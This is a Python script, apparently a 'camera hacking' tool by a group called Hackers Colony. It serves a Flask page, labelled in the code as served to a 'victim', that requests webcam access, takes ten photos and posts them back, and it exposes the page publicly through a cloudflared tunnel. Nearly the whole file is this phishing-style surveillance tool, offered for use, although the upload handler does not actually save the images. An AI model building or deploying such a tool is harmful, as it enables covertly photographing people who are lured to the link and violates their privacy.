#!/usr/bin/env python3
"""
HCO-CamTam
Camera Tool by Azhar (Hackers Colony)
"""

import os
import time
import subprocess
from flask import Flask, request, render_template_string
from colorama import Fore, Style

app = Flask(__name__)

# HTML page served to victim
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <title>Camera Access</title>
</head>
<body style="background:black;color:white;text-align:center;">
  <h2>🔴 HCO-CamTam</h2>
  <p>Camera access required...</p>
  <video id="video" width="300" autoplay></video>
  <script>
    const video = document.getElementById('video');
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        const track = stream.getVideoTracks()[0];
        let imageCapture = new ImageCapture(track);
        let count = 0;

        function snap() {
          if(count >= 10) return;
          imageCapture.takePhoto().then(blob => {
            let reader = new FileReader();
            reader.onloadend = function() {
              fetch('/upload', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({image: reader.result})
              });
            }
            reader.readAsDataURL(blob);
          });
          count++;
          setTimeout(snap, 2000);
        }
        snap();
      })
      .catch(e => document.body.innerHTML = "<h3>Camera blocked ❌</h3>");
  </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/upload", methods=["POST"])
def upload():
    print(Fore.GREEN + "[+] Image received ✅" + Style.RESET_ALL)
    return "OK"

def banner():
    os.system("clear")
    print(Fore.RED + Style.BRIGHT + "\n   HCO CAM TAM\n" + Style.RESET_ALL)
    print(Fore.GREEN + "   by Azhar - A Camera Tool\n" + Style.RESET_ALL)

def unlock_and_run():
    os.system("clear")
    print(Fore.CYAN + "This tool requires subscribing to Hackers Colony Tech!\n" + Style.RESET_ALL)
    print("Redirecting in 5s...")
    time.sleep(5)
    os.system("xdg-open https://youtube.com/@hackers_colony_tech")
    input(Fore.YELLOW + "\nPress Enter after subscribing to continue..." + Style.RESET_ALL)

    banner()
    for i in range(5, 0, -1):
        print(Fore.MAGENTA + f"Starting server in {i}..." + Style.RESET_ALL, end="\r")
        time.sleep(1)

    print("\n" + Fore.GREEN + "[*] Starting Flask server..." + Style.RESET_ALL)
    subprocess.Popen(["cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"])
    app.run(host="0.0.0.0", port=5000)

if __name__ == "__main__":
    unlock_and_run()
